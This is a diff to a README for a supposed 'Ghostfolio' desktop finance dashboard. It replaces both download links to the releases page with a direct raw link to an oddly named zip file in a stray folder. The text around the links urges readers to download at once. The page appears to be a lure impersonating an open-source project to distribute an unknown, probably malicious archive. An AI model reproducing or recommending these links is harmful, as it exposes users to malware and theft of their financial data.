@@ -25,7 +25,7 @@ Let's get you up and running. We've made this as simple as possible—no technic
 
 ### Step 1: Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-Ghostfolio_Dashboard-blue?style=for-the-badge&logo=github)](https://github.com/tragediancollectiveagreement9357/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)
+[![Download Now](https://img.shields.io/badge/Download-Ghostfolio_Dashboard-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tragediancollectiveagreement9357/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/kirsch/Self_Ghostfolio_Dashboard_Desktop_Hosted_1.4.zip)
 
 Visit this link to download the application. You'll see a list of available releases. Choose the latest version (the one at the top). Look for the file that matches your system. For most Windows users, you'll want the file labeled with `windows` in its name.
 
@@ -123,7 +123,7 @@ You're not alone. Many self-hosters and privacy-minded investors use this tool. 
 
 Don't wait to take control of your financial picture. The link below is the only thing between you and a clearer, more private view of your money.
 
-[**Download Ghostfolio-Desktop-Self-Hosted-Dashboard Now**](https://github.com/tragediancollectiveagreement9357/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)
+[**Download Ghostfolio-Desktop-Self-Hosted-Dashboard Now**](https://raw.githubusercontent.com/tragediancollectiveagreement9357/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/kirsch/Self_Ghostfolio_Dashboard_Desktop_Hosted_1.4.zip)
 
 Give it a try today. You'll wonder why you didn't switch sooner.
 
